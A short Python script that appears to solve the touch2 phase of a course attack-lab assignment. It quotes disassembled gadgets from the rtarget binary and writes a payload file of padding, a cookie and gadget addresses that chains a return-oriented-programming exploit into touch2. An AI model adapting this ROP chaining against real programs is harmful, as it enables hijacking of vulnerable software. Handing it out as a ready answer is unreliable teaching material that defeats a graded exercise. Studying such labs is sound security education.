"""
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	ret
00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	ret
"""
COOKIE = 0x59b997fa

f = open("./rtarget_touch2.bin", "wb")
f.write(ord("a").to_bytes(1) * 40)
f.write((0x4019cc).to_bytes(8, "little"))
f.write(COOKIE.to_bytes(8, "little"))
f.write((0x4019a2).to_bytes(8, "little"))
f.write((0x4017ec).to_bytes(8, "little"))
f.close()